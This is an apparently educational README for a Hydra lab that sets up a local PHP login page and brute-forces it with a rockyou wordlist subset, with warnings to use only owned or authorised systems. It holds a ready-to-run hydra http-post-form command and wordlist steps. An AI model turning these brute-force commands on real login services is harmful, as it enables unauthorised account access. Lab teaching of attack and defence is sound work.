# ⚡ Hydra Lab — Simple HTTP Brute-force Demo (Kali) ⚡

**Repo purpose** This repository is for **educational use only** — use it on your **own local machine, VM, or authorized labs** (TryHackMe/HTB/Docker). Never attack public or unauthorised systems.

**Made by ❤️ The Techzeen — Happy Hacking!**

---

## 🔥 What is Hydra? (Short Intro)

**Hydra** is a fast and modular tool used to perform online password-guessing (brute-force) attacks against network services such as HTTP forms, SSH, FTP, SMTP and more. In this repo we’ll use Hydra only against a tiny local PHP login page to **teach** online brute-force concepts, detection, and defenses. 🧠🔐

---

## 🚦 Before you start (Must read)

- ✅ Only run this on your **local machine**, VM, Docker container, or authorized lab (TryHackMe/HTB).
- ❌ Do **not** use Hydra against public websites or services you don't own.
---

## 🛠️ Step-by-step commands (copy one block at a time)

> ⚠️ Run the PHP server in one terminal so it stays visible (server logs show incoming POSTs).

### 1) System update & install PHP & Hydra

```bash
sudo apt update
```

*Update package lists.* 🔄

```bash
sudo apt install -y php-cli hydra
```

*Install PHP CLI (for built-in server) and Hydra (attacker tool).* 🧩

---

### 2) Create demo folder and open nano to create `index.php`

```bash
mkdir -p ~/hydra-demo && cd ~/hydra-demo
```

*Create a demo directory and change into it.* 📁

```bash
nano index.php
```

*Open nano editor — paste the PHP code below, save (Ctrl+O) and exit (Ctrl+X).* ✍️

**Paste this PHP code into **``**:**

```php
<?php
$correct_user = "demo";
$correct_pass = "password123";
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';
    if ($user === $correct_user && $pass === $correct_pass) {
        echo "Login successful. Welcome, " . htmlentities($user) . "!";
    } else {
        echo "Login failed: Invalid username or password.";
    }
    exit;
}
?>
<!doctype html>
<html><head><meta charset="utf-8"><title>Demo Login</title></head>
<body>
  <h2>Demo Login</h2>
  <form method="POST" action="index.php">
    <label>Username: <input type="text" name="username"></label><br><br>
    <label>Password: <input type="password" name="password"></label><br><br>
    <input type="submit" value="Login">
  </form>
</body></html>
```

*This is the minimal login page used for the lab. The failure message **`Login failed`** will be used by Hydra to detect unsuccessful attempts.* 🚨

---

### 3) Start the PHP server (keep this terminal open)

```bash
cd ~/hydra-demo
php -S 0.0.0.0:8000
```

*Start built-in PHP server on port 8000* ▶️

---

### 4) Decompress rockyou and make a small demo list

```bash
cd /usr/share/wordlists
ls
sudo gunzip rockyou.txt.gz
ls
```

*Go to the wordlists folder and decompress the **`rockyou.txt.gz`** file (Kali default).* 🗂️

```bash
head -n 1000 rockyou.txt > ~/rockyou-1000.txt
```

*Create a small 1000-line subset for fast demos.* ⚡

```bash
wc -l ~/rockyou-1000.txt
```

*Show count of lines (sanity check).* 🔢

```bash
echo "password123" >> ~/rockyou-1000.txt
```

*Ensure the demo password is present in the list.* ✅

---

### 5) Confirm server returns the fail string

```bash
curl -s -X POST http://127.0.0.1:8000/index.php -d "username=wrong&password=bad" | sed -n '1,4p'
```

*Confirm output includes **`Login failed`** — Hydra will use this substring to detect failures.* 🔎

---

### 6) Run Hydra (from another terminal)

```bash
hydra -l demo -P ~/rockyou-1000.txt 127.0.0.1 http-post-form \
  "/index.php:username=^USER^&password=^PASS^:Login failed" \
  -s 8000 -t 4 -f -V
```

*Hydra will brute-force the **`demo`** user using the small list; stops on first success (**`-f`**).* ⚔️

---

Made with ❤️ by **The Techzeen** — Happy Hacking! 🎉


